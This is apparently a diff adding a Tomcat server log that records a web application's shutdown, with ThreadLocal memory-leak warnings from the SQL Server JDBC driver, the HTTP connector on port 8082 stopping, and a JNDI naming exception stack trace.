+11-Jun-2023 22:31:41.329 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [4828ed08-8956-4f9c-9657-ca862d391bf5-16]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 22:31:41.329 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [888dd126-9d45-4542-92b4-1b838a7d1647-16]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 22:31:41.329 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [4cc72194-3027-4bc6-9cff-601fa6af3dde-22]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 22:31:41.329 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [8fd68464-cb00-4d6e-bbfa-dd5d69f6d625-6]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 22:31:41.350 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 22:31:41.368 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 22:31:41.371 WARNING [main] org.apache.catalina.deploy.NamingResourcesImpl.cleanUp Failed to retrieve JNDI naming context for container [StandardEngine[Catalina].StandardHost[localhost].StandardContext[/PRJ301_3W]] so no cleanup was performed for that container
+	javax.naming.NamingException: No naming context bound to this class loader
+		at org.apache.naming.ContextBindings.getClassLoader(ContextBindings.java:271)
+		at org.apache.catalina.deploy.NamingResourcesImpl.cleanUp(NamingResourcesImpl.java:1010)
+		at org.apache.catalina.deploy.NamingResourcesImpl.stopInternal(NamingResourcesImpl.java:993)
+		at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
+		at org.apache.catalina.core.StandardContext.stopInternal(StandardContext.java:5194)
+		at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:293)
+		at org.apache.catalina.core.ContainerBase.removeChild(ContainerBase.java:778)
+		at org.apache.catalina.core.ContainerBase.destroyInternal(ContainerBase.java:982)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.core.ContainerBase.removeChild(ContainerBase.java:778)
+		at org.apache.catalina.core.ContainerBase.destroyInternal(ContainerBase.java:982)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.core.StandardService.destroyInternal(StandardService.java:572)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.core.StandardServer.destroyInternal(StandardServer.java:1036)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.startup.Catalina.stop(Catalina.java:850)
+		at org.apache.catalina.startup.Catalina.start(Catalina.java:811)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:347)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:478)
